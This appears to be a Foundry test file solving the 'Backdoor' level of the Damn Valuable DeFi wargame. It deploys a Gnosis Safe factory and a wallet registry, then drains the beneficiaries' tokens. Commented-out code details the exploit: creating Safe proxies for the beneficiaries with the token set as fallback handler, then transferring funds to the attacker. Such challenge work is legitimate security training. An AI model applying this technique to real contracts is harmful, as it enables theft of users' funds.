// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DamnValuableToken} from "@main/DamnValuableToken.sol";
import {WalletRegistry} from "@main/backdoor/WalletRegistry.sol";

import {GnosisSafe} from "@safe/contracts/GnosisSafe.sol";
import {GnosisSafeProxy} from "@safe/contracts/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "@safe/contracts/proxies/GnosisSafeProxyFactory.sol";

import {BackdoorAttacker} from "@main/backdoor/BackdoorAttacker.sol";


contract BackdoorTest is Test {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker;
    address public alice;
    address public bob;
    address public charlie;
    address public david;

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40 ether;
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET = 10 ether;

    DamnValuableToken token;
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    function setUp() public {
        vm.startPrank(deployer);

        attacker = makeAddr("Attacker");
        alice = makeAddr("Alice");
        bob = makeAddr("Bob");
        charlie = makeAddr("Charlie");
        david = makeAddr("David");

        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");


        vm.stopPrank(  );
    }

    modifier beforeEach() {
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        // Deploy GnosisSafe mastercopy and factory
        masterCopy = new GnosisSafe();
        walletFactory = new GnosisSafeProxyFactory();
       
        vm.label(address(masterCopy), "GnosisSafe");
        vm.label(address(walletFactory), "GnosisSafeProxyFactory");
        vm.label(address(token), "DamnValuableToken");

        address[] memory beneficiaries = new address[](4);

        beneficiaries[0] = alice;
        beneficiaries[1] = bob;
        beneficiaries[2] = charlie;
        beneficiaries[3] = david;

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(token),
            beneficiaries
        );
        vm.label(address(walletRegistry), "WalletRegistry");


        assertTrue(walletRegistry.beneficiaries(alice));
        assertTrue(walletRegistry.beneficiaries(bob));
        assertTrue(walletRegistry.beneficiaries(charlie));
        assertTrue(walletRegistry.beneficiaries(david));

        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED );
        
        vm.stopPrank(  );
        _;
    }

    function test_isSolved( ) public beforeEach() {
        vm.startPrank(attacker);

        address[] memory beneficiaries = new address[](4);

        beneficiaries[0] = alice;
        beneficiaries[1] = bob;
        beneficiaries[2] = charlie;
        beneficiaries[3] = david;

        new BackdoorAttacker(attacker, address(token), address(masterCopy), address(walletFactory), address(walletRegistry), beneficiaries );

        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED );


        // for( uint i = 0; i < beneficiaries.length; i++ ) {
        //     // setup wallet beneficiary
        //     address[] memory walletOwners = new address[](1);
        //     walletOwners[0] = beneficiaries[i];

        //     // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
        //     // this will allow us to execute calls to the token contract from the wallet without being the owner
        //     bytes memory initializer = abi.encodeWithSignature(
        //         "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
        //         walletOwners,   // _owners
        //         1,              // _threshold
        //         address(0),     // to
        //         "",             // data
        //         address(token), // fallbackHandler
        //         address(0),     // paymentToken
        //         0,              // payment
        //         address(0)      // paymentReceiver
        //     );

        //     // generate the wallet and call the registry callback
        //     GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);

        //     assertEq(token.balanceOf(address(proxy)), AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET );

        //     (bool approveSuccess, ) = address(proxy).call(
        //         abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
        //     );
        //     assertEq(approveSuccess, true);

        // }


        vm.stopPrank( );
    }


}


// contract BackdoorModule {
//     function approve(
//         address approvalAddress,
//         address token,
//         uint256 amount
//     ) public {
//         DamnValuableToken(token).approve(approvalAddress, amount);
//     }
// }